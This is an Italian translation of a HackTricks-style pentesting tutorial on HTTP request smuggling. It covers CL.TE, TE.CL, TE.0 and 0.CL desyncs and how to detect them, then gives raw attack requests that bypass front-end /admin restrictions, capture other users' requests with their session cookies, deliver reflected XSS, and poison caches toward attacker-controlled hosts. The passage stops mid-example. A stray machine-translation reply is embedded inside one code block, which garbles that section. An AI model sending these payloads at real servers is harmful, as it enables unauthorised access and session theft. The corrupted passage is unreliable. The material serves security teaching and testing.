# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Che cos'è

Questa vulnerabilità si verifica quando una **desyncronization** tra **front-end proxies** e il **back-end** server permette a un **attacker** di **send** una richiesta HTTP che sarà **interpreted** come una **single request** dai **front-end** proxies (load balance/reverse-proxy) e **as 2 request** dal **back-end** server.\
Questo consente a un utente di **modify the next request that arrives to the back-end server after his**.

### Teoria

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Realtà

Il **Front-End** (un load-balance / Reverse Proxy) **process** l'header _**Content-Length**_ o l'header _**Transfer-Encoding**_ e il **Back-end** server **process the other**, provocando una **desyncronization** tra i 2 sistemi.\
Questo può essere molto critico perché **an attacker will be able to send one request** al reverse proxy che sarà **interpreted** dal **back-end** server **as 2 different requests**. Il **pericolo** di questa tecnica risiede nel fatto che il **back-end** server **will interpret** la **2nd request injected** come se **came from the next client** e la **real request** di quel client sarà **part** della **injected request**.

### Particolarità

Ricorda che in HTTP **un carattere di nuova linea è composto da 2 byte:**

- **Content-Length**: Questo header usa un **numero decimale** per indicare il **numero** di **bytes** del **body** della richiesta. Il body è previsto che finisca con l'ultimo carattere, **non è necessaria una nuova linea alla fine della richiesta**.
- **Transfer-Encoding:** Questo header utilizza nel **body** un **numero esadecimale** per indicare il **numero** di **bytes** del **prossimo chunk**. Il **chunk** deve **terminare** con una **nuova linea** ma questa nuova linea **non è conteggiata** dall'indicatore di lunghezza. Questo metodo di trasferimento deve terminare con un **chunk di size 0 seguito da 2 nuove linee**: `0`
- **Connection**: Dalla mia esperienza è raccomandato usare **`Connection: keep-alive`** sulla prima request dello request Smuggling.

### Visibile - Nascosto

Il problema principale con http/1.1 è che tutte le requests viaggiano nello stesso socket TCP, quindi se viene trovata una discrepanza tra 2 sistemi che ricevono le richieste è possibile inviare una request che sarà trattata come 2 richieste differenti (o più) dal backend finale (o anche da sistemi intermedi).

**[This blog post](https://portswigger.net/research/http1-must-die)** propone nuovi modi per rilevare desync attacks a un sistema che non saranno segnalati dai WAF. Per questo presenta i comportamenti Visible vs Hidden. L'obiettivo in questo caso è cercare discrepanze nelle risposte usando tecniche che potrebbero causare desync senza sfruttare effettivamente nulla.

Per esempio, inviando una request con l'header normale Host e un header " host", se il backend si lamenta di questa request (forse perché il valore di " host" è errato) potrebbe significare che il front-end non ha visto l'header " host" mentre il backend finale lo ha usato, altamente probabile implicando una desync tra front-end e backend.

Questo sarebbe una discrepanza **Nascosto-Visibile**.

Se il front-end avesse preso in considerazione l'header " host" ma il backend no, questa potrebbe essere stata una situazione **Visibile-Nascosto**.

Per esempio, questo ha permesso di scoprire desyncs tra AWS ALB come front-end e IIS come backend. Questo perché quando è stato inviato "Host: foo/bar" l'ALB ha restituito `400, Server; awselb/2.0`, ma quando è stato inviato "Host : foo/bar" ha restituito `400, Server: Microsoft-HTTPAPI/2.0`, indicando che il backend stava inviando la risposta. Questa è una situazione Nascosto-Visibile (H-V).

Nota che questa situazione non è corretta in AWS, ma può essere prevenuta impostando `routing.http.drop_invalid_header_fields.enabled` e `routing.http.desync_mitigation_mode = strictest`.


## Esempi di base

> [!TIP]
> Quando provi a sfruttare questo con Burp Suite **disabilita `Update Content-Length` e `Normalize HTTP/1 line endings`** nel repeater perché alcuni gadget abusano di newlines, carriage returns e content-length malformati.

Gli attacchi di HTTP request smuggling sono creati inviando richieste ambigue che sfruttano discrepanze nel modo in cui front-end e back-end interpretano gli header `Content-Length` (CL) e `Transfer-Encoding` (TE). Questi attacchi possono manifestarsi in diverse forme, principalmente come **CL.TE**, **TE.CL**, e **TE.TE**. Ogni tipo rappresenta una combinazione diversa di come i server front-end e back-end danno priorità a questi header. Le vulnerabilità sorgono dal fatto che i server processano la stessa request in modi diversi, portando a risultati inaspettati e potenzialmente dannosi.

### Esempi base di tipi di vulnerabilità

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> Al tavolo precedente dovresti aggiungere la tecnica TE.0, simile a CL.0 ma usando Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Processa la request basandosi sull'header `Content-Length`.
- **Back-End (TE):** Processa la request basandosi sull'header `Transfer-Encoding`.
- **Scenario di attacco:**

- L'attacker invia una request dove il valore dell'header `Content-Length` non corrisponde alla lunghezza effettiva del contenuto.
- Il front-end server inoltra l'intera request al back-end, basandosi sul valore di `Content-Length`.
- Il back-end server processa la request come chunked a causa dell'header `Transfer-Encoding: chunked`, interpretando i dati rimanenti come una request separata e successiva.
- **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Processa la request basandosi sull'header `Transfer-Encoding`.
- **Back-End (CL):** Processa la request basandosi sull'header `Content-Length`.
- **Scenario di attacco:**

- L'attacker invia una request chunked dove la dimensione del chunk (`7b`) e la lunghezza effettiva del contenuto (`Content-Length: 4`) non sono allineate.
- Il front-end server, rispettando `Transfer-Encoding`, inoltra l'intera request al back-end.
- Il back-end server, rispettando `Content-Length`, processa solo la parte iniziale della request (`7b` bytes), lasciando il resto come parte di una request successiva non intenzionale.
- **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Entrambi supportano `Transfer-Encoding`, ma uno può essere ingannato nell'ignorarlo tramite obfuscation.
- **Scenario di attacco:**

- L'attacker invia una request con header `Transfer-Encoding` obfuscati.
- A seconda di quale server (front-end o back-end) non riconosce l'obfuscation, si può sfruttare una vulnerabilità CL.TE o TE.CL.
- La parte non processata della request, come vista da uno dei server, diventa parte di una request successiva, portando a smuggling.
- **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Entrambi i server processano la request basandosi esclusivamente sull'header `Content-Length`.
- Questo scenario tipicamente non porta a smuggling, poiché c'è allineamento nel modo in cui entrambi i server interpretano la lunghezza della request.
- **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Si riferisce a scenari dove l'header `Content-Length` è presente e ha un valore diverso da zero, indicando che il body della request ha contenuto. Il back-end ignora l'header `Content-Length` (che viene trattato come 0), ma il front-end lo analizza.
- È cruciale per comprendere e creare attacchi di smuggling, poiché influenza come i server determinano la fine di una request.
- **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Come il precedente ma usando TE
- Tecnica [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Esempio**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Scenario

In una situazione `0.CL` viene inviata una request con un Content-Length come:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
Il front-end non tiene conto del `Content-Length`, quindi invia solo la prima request al backend (fino al 7 nell'esempio). Tuttavia il backend vede il `Content-Length` e aspetta un body che non arriva mai, perché il front-end è già in attesa della response.

Se invece è possibile inviare al backend una request che venga risposta prima di ricevere il suo body, questo deadlock non si verifica. In IIS, ad esempio, questo accade inviando request a nomi riservati come `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), in questo modo la request iniziale viene risposta direttamente e la seconda request conterrà la request della victim come:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
Questo è utile per causare una desync, ma finora non avrà alcun impatto.

Tuttavia, il post offre una soluzione convertendo una **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Rompere il web server

Questa tecnica è utile anche in scenari in cui è possibile **rompere un web server mentre si leggono i dati HTTP iniziali** ma **senza chiudere la connessione**. In questo modo, il **body** della richiesta HTTP sarà considerato la **next HTTP request**.

Per esempio, come spiegato in [**this writeup**](https://mizu.re/post/twisty-python), in Werkzeug era possibile inviare alcuni caratteri **Unicode** che avrebbero fatto **break** il server. Tuttavia, se la connessione HTTP era stata creata con l'header **`Connection: keep-alive`**, il body della richiesta non verrà letto e la connessione resterà aperta, quindi il **body** della richiesta sarà trattato come la **next HTTP request**.

#### Forzare tramite hop-by-hop headers

Abusando degli hop-by-hop headers si può indicare al proxy di **cancellare l'header Content-Length o Transfer-Encoding, rendendo possibile sfruttare un HTTP request smuggling**.
```
Connection: Content-Length
```
Per **more information about hop-by-hop headers** visita:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Individuazione di HTTP Request Smuggling

Identificare vulnerabilità di HTTP request smuggling può spesso essere ottenuto utilizzando tecniche basate sul timing, che si basano sull'osservazione di quanto tempo impiega il server a rispondere a richieste manipolate. Queste tecniche sono particolarmente utili per rilevare CL.TE e TE.CL. Oltre a questi metodi, esistono altre strategie e strumenti che possono essere usati per trovare tali vulnerabilità:

### Individuazione di vulnerabilità CL.TE con tecniche di timing

- **Method:**

- Inviare una richiesta che, se l'applicazione è vulnerabile, farà sì che il server back-end aspetti dati aggiuntivi.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Observation:**
- Il server front-end elabora la richiesta basandosi su `Content-Length` e tronca il messaggio prematuramente.
- Il server back-end, aspettandosi un messaggio chunked, aspetta il chunk successivo che non arriva mai, causando un ritardo.

- **Indicators:**
- Timeout o lunghi ritardi nella risposta.
- Ricezione di un errore 400 Bad Request dal server back-end, a volte con informazioni dettagliate sul server.

### Individuazione di vulnerabilità TE.CL con tecniche di timing

- **Method:**

- Inviare una richiesta che, se l'applicazione è vulnerabile, farà sì che il server back-end aspetti dati aggiuntivi.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Observation:**
- Il server front-end elabora la richiesta basandosi su `Transfer-Encoding` e inoltra l'intero messaggio.
- Il server back-end, aspettandosi un messaggio basato su `Content-Length`, aspetta dati aggiuntivi che non arrivano mai, causando un ritardo.

### Altri metodi per individuare vulnerabilità

- **Analisi differenziale delle risposte:**
- Inviare versioni leggermente diverse di una richiesta e osservare se le risposte del server differiscono in modo inatteso, indicando una discrepanza nel parsing.
- **Uso di strumenti automatici:**
- Strumenti come l'estensione 'HTTP Request Smuggler' di Burp Suite possono testare automaticamente queste vulnerabilità inviando varie forme di richieste ambigue e analizzando le risposte.
- **Test di variabilità di Content-Length:**
- Inviare richieste con valori `Content-Length` variabili che non corrispondono alla lunghezza effettiva del contenuto e osservare come il server gestisce tali discrepanze.
- **Test di variabilità di Transfer-Encoding:**
- Inviare richieste con header `Transfer-Encoding` offuscati o malformati e monitorare come front-end e back-end rispondono in modo differente a tali manipolazioni.

### L'header `Expect: 100-continue`

Check how this header can help exploiting a http desync in:

{{#ref}}
../special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Dopo aver confermato l'efficacia delle tecniche di timing, è cruciale verificare se le richieste del client possono essere manipolate. Un metodo semplice è provare a avvelenare le tue richieste, per esempio facendo in modo che una richiesta a `/` restituisca un 404. Gli esempi CL.TE e TE.CL discussi in precedenza in [Basic Examples](#basic-examples) mostrano come avvelenare la richiesta di un client per ottenere una risposta 404, nonostante il client mirasse ad accedere a una risorsa diversa.

**Considerazioni chiave**

Quando testi per vulnerabilità di request smuggling interferendo con altre richieste, tieni presente:

- **Connessioni di rete distinte:** Le richieste "attack" e "normal" dovrebbero essere inviate su connessioni di rete separate. Utilizzare la stessa connessione per entrambe non convalida la presenza della vulnerabilità.
- **URL e parametri coerenti:** Cerca di usare URL identici e gli stessi nomi di parametri per entrambe le richieste. Le applicazioni moderne spesso instradano le richieste a specifici server back-end in base a URL e parametri. Far corrispondere questi elementi aumenta la probabilità che entrambe le richieste siano elaborate dallo stesso server, prerequisito per un attacco riuscito.
- **Tempi e condizioni di race:** La richiesta "normal", destinata a rilevare l'interferenza dalla richiesta "attack", gareggia contro altre richieste concorrenti dell'applicazione. Perciò invia la richiesta "normal" immediatamente dopo la richiesta "attack". Applicazioni molto trafficate possono richiedere più tentativi per una conferma conclusiva della vulnerabilità.
- **Sfide di load balancing:** I server front-end che agiscono come load balancer possono distribuire le richieste su vari sistemi back-end. Se le richieste "attack" e "normal" finiscono su sistemi diversi, l'attacco non avrà successo. Questo aspetto del bilanciamento del carico può richiedere più tentativi per confermare una vulnerabilità.
- **Impatto involontario sugli utenti:** Se il tuo attacco incide involontariamente sulla richiesta di un altro utente (non sulla richiesta "normal" che hai inviato per il rilevamento), ciò indica che il tuo attacco ha influenzato un altro utente dell'applicazione. Test continui potrebbero disturbare altri utenti, richiedendo un approccio prudente.

## Distinguere gli artefatti di pipelining HTTP/1.1 dal vero request smuggling

Il riuso della connessione (keep-alive) e il pipelining possono facilmente creare illusioni di "smuggling" negli strumenti di testing che inviano più richieste sullo stesso socket. Impara a separare gli artefatti innocui lato client da un vero desync lato server.

### Perché il pipelining crea falsi positivi classici

HTTP/1.1 riutilizza una singola connessione TCP/TLS e concatena richieste e risposte sullo stesso stream. Nel pipelining, il client invia più richieste in rapida successione e si affida a risposte in ordine. Un falso positivo comune è reinviare due volte un payload malformato in stile CL.0 sulla stessa connessione:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
I don't have the file contents. Please paste the contents of src/pentesting-web/http-request-smuggling/README.md here (or upload it). I will then translate the English text to Italian, preserving all markdown, code blocks, tags, links, refs and paths exactly as you requested.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Se il server ha ignorato il `Content_Length` malformato, non c'è desync FE↔BE. Con reuse, il tuo client ha effettivamente inviato questo byte-stream, che il server ha interpretato come due richieste indipendenti:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impatto: nessuno. Hai semplicemente desynced il tuo client dal framing del server.

> [!TIP]
> I moduli di Burp che dipendono da reuse/pipelining: Turbo Intruder con `requestsPerConnection>1`, Intruder con "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" o "Enable connection reuse".

### Test fondamentali: pipelining o desync reale?

1. Disabilita reuse e riprova
- In Burp Intruder/Repeater, disattiva HTTP/1 reuse ed evita "Send group in sequence".
- In Turbo Intruder, imposta `requestsPerConnection=1` e `pipeline=False`.
- Se il comportamento scompare, probabilmente si trattava di pipelining lato client, a meno che tu non stia trattando con target connection-locked/stateful o con desync lato client.
2. Controllo nested-response via HTTP/2
- Invia una richiesta HTTP/2. Se il body della risposta contiene una completa nested HTTP/1 response, hai dimostrato un bug di parsing/desync lato backend invece di un mero artefatto client.
3. Probe partial-requests per front-end connection-locked
- Alcuni FE riutilizzano la connessione upstream verso il BE solo se il client ha riutilizzato la sua. Usa partial-requests per rilevare un comportamento del FE che rispecchia il reuse del client.
- Vedi PortSwigger "Browser‑Powered Desync Attacks" per la tecnica connection-locked.
4. Prove di stato
- Cerca differenze tra first- e subsequent-request sulla stessa connessione TCP (first-request routing/validation).
- Burp "HTTP Request Smuggler" include una connection‑state probe che automatizza questo.
5. Visualizza il wire
- Usa l'estensione Burp "HTTP Hacker" per ispezionare concatenation e message framing direttamente mentre sperimenti con reuse e partial requests.

### Connection‑locked request smuggling (reuse-required)

Alcuni front-end riutilizzano la connessione upstream solo quando il client riutilizza la sua. Lo smuggling reale esiste ma è condizionato al reuse lato client. Per distinguere e dimostrare l'impatto:
- Dimostra il bug lato server
- Usa il controllo HTTP/2 nested-response, oppure
- Usa partial-requests per mostrare che il FE riutilizza l'upstream solo quando lo fa il client.
- Mostra un impatto reale anche se l'abuso diretto di socket cross-user è bloccato:
- Cache poisoning: inquina shared caches tramite il desync in modo che le risposte influenzino altri utenti.
- Internal header disclosure: riflettere FE-injected headers (es., auth/trust headers) e pivotare verso auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combina con host routing quirks per pivotare verso internal vhosts.
- Workflow dell'operatore
- Riproduci con reuse controllato (Turbo Intruder `requestsPerConnection=2`, o Burp Repeater tab group → "Send group in sequence (single connection)").
- Poi concatena a primitive cache/header-leak/control-bypass e dimostra impatto cross-user o di autorizzazione.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

Se stai prendendo di mira browser-powered/client-side desync, la richiesta malevola deve poter essere inviata dal browser cross-origin. I trucchi di header obfuscation non funzioneranno. Concentrati su primitive raggiungibili via navigation/fetch, e poi pivot verso cache poisoning, header disclosure, o front-end control bypass dove componenti downstream riflettono o cachano risposte.

Per background e workflow end-to-end:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): espone il comportamento HTTP a basso livello e la socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: controllo preciso sul connection reuse tramite `requestsPerConnection`.
- Burp HTTP Request Smuggler: include una connection‑state probe per individuare first‑request routing/validation.

> [!NOTE]
> Tratta gli effetti dovuti solo al reuse come non-problemi a meno che tu non riesca a dimostrare un desync lato server e collegare un impatto concreto (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abuso di HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

A volte, i proxy front-end applicano misure di sicurezza che scrutinano le richieste in ingresso. Tuttavia, queste misure possono essere aggirate sfruttando HTTP Request Smuggling, permettendo accesso non autorizzato a endpoint ristretti. Per esempio, l'accesso a `/admin` potrebbe essere proibito dall'esterno, con il proxy front-end che blocca attivamente tali tentativi. Nonostante ciò, questo proxy potrebbe non ispezionare le richieste embedded all'interno di una richiesta HTTP smuggled, lasciando una falla per bypassare queste restrizioni.

Considera i seguenti esempi che illustrano come HTTP Request Smuggling possa essere usato per aggirare i controlli di sicurezza del front-end, prendendo specificamente di mira il percorso `/admin` che è tipicamente protetto dal proxy front-end:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
In the CL.TE attack, l'intestazione `Content-Length` viene sfruttata per la richiesta iniziale, mentre la successiva richiesta incorporata utilizza l'intestazione `Transfer-Encoding: chunked`. Il front-end proxy elabora la richiesta `POST` iniziale ma non riesce a ispezionare la richiesta incorporata `GET /admin`, consentendo l'accesso non autorizzato al percorso `/admin`.

**TE.CL Esempio**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Al contrario, nell'attacco TE.CL la richiesta iniziale `POST` utilizza `Transfer-Encoding: chunked`, e la richiesta incorporata successiva viene elaborata in base all'intestazione `Content-Length`. Analogamente all'attacco CL.TE, il front-end proxy trascura la smuggled `GET /admin` request, concedendo involontariamente l'accesso al percorso protetto `/admin`.

### Revealing front-end request rewriting <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Le applicazioni spesso impiegano un **front-end server** per modificare le richieste in ingresso prima di inoltrarle al back-end server. Una modifica tipica consiste nell'aggiungere headers, come `X-Forwarded-For: <IP of the client>`, per inoltrare l'IP del client al back-end. Comprendere queste modifiche può essere cruciale, poiché potrebbe rivelare modi per **bypass protections** o **uncover concealed information or endpoints**.

Per verificare come un proxy altera una richiesta, individua un parametro `POST` che il back-end ripete nella risposta. Poi, crea una richiesta, usando questo parametro per ultimo, simile alla seguente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In questa struttura, i componenti delle richieste successive vengono aggiunti dopo `search=`, che è il parametro riflesso nella risposta. Questa riflessione esporrà gli header della richiesta successiva.

È importante allineare l'header `Content-Length` della richiesta annidata con la lunghezza effettiva del contenuto. È consigliabile partire con un valore piccolo e incrementarlo gradualmente, poiché un valore troppo basso troncherà i dati riflessi, mentre un valore troppo alto può causare errori nella richiesta.

Questa tecnica è applicabile anche nel contesto di una vulnerabilità TE.CL, ma la richiesta dovrebbe terminare con `search=\r\n0`. Indipendentemente dai caratteri di newline, i valori verranno aggiunti al parametro search.

Questo metodo serve principalmente per comprendere le modifiche alle richieste effettuate dal front-end proxy, eseguendo essenzialmente un'indagine autoguidata.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

È possibile catturare le richieste dell'utente successivo aggiungendo una specifica request come valore di un parametro durante un'operazione POST. Ecco come può essere fatto:

Aggiungendo la seguente request come valore di un parametro, è possibile memorizzare la richiesta del client successivo:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In questo scenario, il **comment parameter** è destinato a memorizzare il contenuto della sezione commenti di un post su una pagina accessibile pubblicamente. Di conseguenza, il contenuto della richiesta successiva apparirà come commento.

Tuttavia, questa tecnica ha dei limiti. Generalmente cattura i dati solo fino al delimitatore di parametro usato nella smuggled request. Per le URL-encoded form submissions, questo delimitatore è il carattere `&`. Ciò significa che il contenuto catturato dalla richiesta dell'utente vittima si interromperà al primo `&`, che potrebbe anche far parte della query string.

Inoltre, vale la pena notare che questo approccio è valido anche con una vulnerabilità TE.CL. In tali casi, la richiesta dovrebbe terminare con `search=\r\n0`. Indipendentemente dai caratteri di nuova riga, i valori verranno aggiunti al parametro search.

### Usare HTTP Request Smuggling per sfruttare Reflected XSS

HTTP Request Smuggling può essere impiegato per sfruttare pagine web vulnerabili a **Reflected XSS**, offrendo vantaggi significativi:

- L'interazione con gli utenti target non è **necessaria**.
- Permette lo sfruttamento di XSS in parti della richiesta che sono **normalmente inaccessibili**, come gli HTTP request headers.

Negli scenari in cui un sito è suscettibile a Reflected XSS attraverso l'User-Agent header, il payload seguente dimostra come sfruttare questa vulnerabilità:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Questo payload è strutturato per sfruttare la vulnerabilità in questo modo:

1. Avviare una richiesta `POST`, apparentemente normale, con l'header `Transfer-Encoding: chunked` per indicare l'inizio dello smuggling.
2. Seguire con uno `0`, che segna la fine del corpo del messaggio chunked.
3. Poi viene introdotta una richiesta `GET` smuggled, dove l'header `User-Agent` viene iniettato con lo script `<script>alert(1)</script>`, innescando la XSS quando il server elabora questa richiesta successiva.

Manipolando il `User-Agent` tramite smuggling, il payload aggira i normali vincoli delle richieste, sfruttando così la vulnerabilità Reflected XSS in modo non standard ma efficace.

#### HTTP/0.9

> [!CAUTION]
> Nel caso il contenuto dell'utente venga riflesso in una risposta con un **`Content-type`** come **`text/plain`**, ciò impedirebbe l'esecuzione della XSS. Se il server supporta **HTTP/0.9 potrebbe essere possibile bypassare questo**!

La versione HTTP/0.9 è precedente a HTTP/1.0 e utilizza soltanto i verbi **GET** e **non** risponde con **headers**, ma solo con il body.

In [**this writeup**](https://mizu.re/post/twisty-python), questo è stato sfruttato tramite request smuggling e un **endpoint vulnerabile che risponde con l'input dell'utente** per inviare di nascosto una richiesta con HTTP/0.9. Il parametro riflesso nella risposta conteneva una **falsa risposta HTTP/1.1 (con headers e body)**, quindi la risposta avrebbe contenuto codice JS eseguibile valido con un `Content-Type` di `text/html`.

### Sfruttare i redirect on-site con HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Le applicazioni spesso reindirizzano da un URL a un altro usando il nome host preso dall'header `Host` nell'URL di redirect. Questo è comune con web server come Apache e IIS. Per esempio, richiedere una cartella senza la barra finale provoca un redirect per includere la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Risultati in:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Sebbene apparentemente innocuo, questo comportamento può essere manipolato utilizzando HTTP request smuggling per reindirizzare gli utenti a un sito esterno. Ad esempio:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Questa smuggled request potrebbe causare che la prossima richiesta utente processata venga reindirizzata a un attacker-controlled website:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Risultati in:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In questo scenario, la richiesta di un file JavaScript da parte di un utente viene dirottata. L'attaccante può potenzialmente compromettere l'utente servendo JavaScript malevolo in risposta.

### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning può essere eseguito se qualsiasi componente della **infrastruttura front-end memorizza nella cache i contenuti**, tipicamente per migliorare le prestazioni. Manipolando la risposta del server, è possibile **poison the cache**.

In precedenza, abbiamo visto come le risposte del server potessero essere alterate per restituire un errore 404 (vedi [Basic Examples](#basic-examples)). Allo stesso modo, è fattibile ingannare il server affinché consegni il contenuto di `/index.html` in risposta a una richiesta per `/static/include.js`. Di conseguenza, il contenuto di `/static/include.js` viene sostituito nella cache con quello di `/index.html`, rendendo `/static/include.js` inaccessibile agli utenti e potenzialmente causando un Denial of Service (DoS).

Questa tecnica diventa particolarmente potente se viene scoperta una **Open Redirect vulnerability** o se esiste un **on-site redirect to an open redirect**. Tali vulnerabilità possono essere sfruttate per sostituire il contenuto memorizzato in cache di `/static/include.js` con uno script sotto il controllo dell'attaccante, abilitando di fatto un diffuso Cross-Site Scripting (XSS) contro tutti i client che richiedono il `/static/include.js` aggiornato.

Di seguito è mostrata un'illustrazione dello sfruttamento di **cache poisoning combined with an on-site redirect to open redirect**. L'obiettivo è alterare il contenuto della cache di `/static/include.js` per servire codice JavaScript controllato dall'attaccante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
